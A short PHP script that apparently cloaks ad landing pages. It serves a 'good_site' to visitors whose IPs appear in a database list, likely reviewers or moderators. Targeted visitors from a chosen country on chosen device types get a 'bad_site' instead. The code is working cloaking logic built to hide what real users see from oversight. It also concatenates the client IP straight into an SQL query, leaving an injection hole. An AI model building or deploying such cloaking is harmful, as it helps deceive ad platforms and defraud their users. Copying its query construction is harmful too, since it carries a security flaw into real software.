<?php 

// Routes
function goGoodSite()
{
    $actual_link = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'] . "good_site/";
    if (file_exists('good_site/index.html')) $actual_link .= 'index.html';
    echo get_remote_data($actual_link);
    exit();
}

function goBadSite()
{
    $actual_link = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'] . "bad_site/";
    if (file_exists('bad_site/index.html')) $actual_link .= 'index.html';
    echo get_remote_data($actual_link);
    exit();
}


// Checking Client IP
$client_ip = get_client_ip();

if ($client_ip != NULL) {
    
    // Create connection
    $conn = new mysqli($servername, $username, $password, $dbname);
    // Check connection
    if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    }
    
    $sql = "SELECT id FROM ips WHERE adress = '" . $client_ip . "' LIMIT 1";
    $result = $conn->query($sql);
    
    if ($result->num_rows > 0) {
        goGoodSite();
    }
    
    $conn->close();
}


// Checking targeting settings
$detect = new Detector();
$showAd = false;

foreach ($settings['targeting'] as $target => $val) {
    if ($val === true) {
        $methodName = 'is' . $target;
        $showAd |= $detect->$methodName();
    }
}


// Checking targeting settings
$userCountry = ip_info("Visitor", "Country Code");

if ($userCountry == $settings['country_code'] && $showAd) {
    goBadSite();
} else {
    goGoodSite();
}

?>